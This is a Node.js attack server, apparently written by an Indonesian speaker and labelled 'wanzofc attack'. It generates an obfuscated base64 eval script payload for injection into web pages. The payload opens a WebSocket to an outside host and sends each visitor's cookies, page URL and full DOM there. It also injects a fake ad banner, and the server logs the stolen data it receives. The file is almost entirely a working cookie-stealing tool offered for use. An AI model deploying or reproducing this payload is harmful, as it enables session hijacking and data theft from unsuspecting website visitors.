const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const cors = require("cors");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = 3000;

app.use(cors());
app.use(express.json());

/**
 * Fungsi untuk menghasilkan payload script base64 + eval
 */
function generatePayload(nonce = Math.floor(Math.random() * 99999)) {
  const websocketURL = `ws://wanzofc-attack.up.railway.app:${PORT}`;
  const code = `
    (function() {
      try {
        const ws${nonce} = new WebSocket("${websocketURL}");
        ws${nonce}.onopen = function() {
          const data = {
            url: window.location.href,
            cookie: document.cookie,
            dom: document.documentElement.outerHTML,
            timestamp: new Date().toISOString()
          };
          ws${nonce}.send(JSON.stringify(data));
        };

        ws${nonce}.onerror = function(e) {
          ws${nonce}.send(JSON.stringify({ error: e.message }));
        };

        setTimeout(() => {
          const ad = document.createElement('div');
          ad.innerHTML = '<b>IKLAN</b> - Website Aman oleh Wanz';
          ad.style.position = 'fixed';
          ad.style.bottom = '0';
          ad.style.width = '100%';
          ad.style.background = 'black';
          ad.style.color = 'white';
          ad.style.textAlign = 'center';
          document.body.appendChild(ad);

          ws${nonce}.send(JSON.stringify({
            adData: { message: ad.innerHTML, timestamp: new Date().toISOString() }
          }));
        }, 1000);
      } catch (err) {
        console.error(err);
      }
    })();
  `;
  const encoded = Buffer.from(code).toString("base64");
  const finalPayload = `<script>eval(atob("${encoded}"))</script>`;
  return finalPayload;
}

// Endpoint untuk ambil payload
app.get("/payload", (req, res) => {
  const payload = generatePayload();
  console.log("\n[+] Payload baru digenerate:\n");
  console.log(payload);
  res.type("text/html").send(`
    <h2>wanzofc attack</h2>
    <textarea style="width:100%; height:150px;">${payload}</textarea>
    <p>Salin dan pasang ke halaman <b>yang kamu miliki</b> testt kontol.</p>
  `);
});

// WebSocket untuk terima data
wss.on("connection", (ws, req) => {
  console.log("[+] Koneksi WebSocket dari:", req.socket.remoteAddress);

  ws.on("message", (msg) => {
    try {
      const data = JSON.parse(msg);

      if (data.url) {
        console.log("\n[DATA MASUK]");
        console.log("URL :", data.url);
        console.log("Cookie :", data.cookie);
        console.log("Waktu :", data.timestamp);
      }

      if (data.dom) {
        console.log("[DOM]:", data.dom.substring(0, 200), "...");
      }

      if (data.adData) {
        console.log("[AD]:", data.adData.message);
      }

      if (data.error) {
        console.error("[ERROR]:", data.error);
      }

    } catch (err) {
      console.error("JSON parse gagal:", msg);
    }
  });

  ws.on("close", () => {
    console.log("[-] Koneksi WebSocket tertutup");
  });
});

// Jalankan server
server.listen(PORT, "0.0.0.0", () => {
  console.log(`[*] Server berjalan di http://0.0.0.0:${PORT}`);
  console.log(`[*] Dapatkan payload di http://localhost:${PORT}/payload`);
});
